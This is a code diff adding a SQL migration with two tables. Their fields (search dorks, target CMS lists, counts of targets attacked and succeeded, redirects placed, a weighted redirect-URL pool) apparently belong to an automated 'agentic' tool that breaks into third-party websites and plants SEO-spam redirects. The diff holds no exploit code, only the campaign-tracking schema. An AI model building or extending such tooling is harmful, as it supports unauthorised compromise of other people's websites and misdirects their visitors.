@@ -1,0 +1,41 @@
+CREATE TABLE `agentic_sessions` (
+	`id` int AUTO_INCREMENT NOT NULL,
+	`userId` int NOT NULL,
+	`status` varchar(32) NOT NULL DEFAULT 'running',
+	`mode` varchar(32) NOT NULL DEFAULT 'full_auto',
+	`redirectUrls` json,
+	`targetCms` json,
+	`maxTargetsPerRun` int NOT NULL DEFAULT 50,
+	`maxConcurrent` int NOT NULL DEFAULT 3,
+	`seoKeywords` json,
+	`customDorks` json,
+	`targetsDiscovered` int NOT NULL DEFAULT 0,
+	`targetsAttacked` int NOT NULL DEFAULT 0,
+	`targetsSucceeded` int NOT NULL DEFAULT 0,
+	`targetsFailed` int NOT NULL DEFAULT 0,
+	`totalRedirectsPlaced` int NOT NULL DEFAULT 0,
+	`startedAt` timestamp NOT NULL DEFAULT (now()),
+	`lastActivityAt` timestamp,
+	`completedAt` timestamp,
+	`currentPhase` varchar(128) DEFAULT 'initializing',
+	`currentTarget` varchar(512),
+	`eventsLog` json,
+	`errors` json,
+	`createdAt` timestamp NOT NULL DEFAULT (now()),
+	CONSTRAINT `agentic_sessions_id` PRIMARY KEY(`id`)
+);
+--> statement-breakpoint
+CREATE TABLE `redirect_url_pool` (
+	`id` int AUTO_INCREMENT NOT NULL,
+	`url` varchar(512) NOT NULL,
+	`label` varchar(128),
+	`weight` int NOT NULL DEFAULT 1,
+	`isActive` boolean NOT NULL DEFAULT true,
+	`isDefault` boolean NOT NULL DEFAULT false,
+	`successCount` int NOT NULL DEFAULT 0,
+	`failCount` int NOT NULL DEFAULT 0,
+	`lastUsedAt` timestamp,
+	`createdAt` timestamp NOT NULL DEFAULT (now()),
+	`updatedAt` timestamp NOT NULL DEFAULT (now()),
+	CONSTRAINT `redirect_url_pool_id` PRIMARY KEY(`id`)
+);
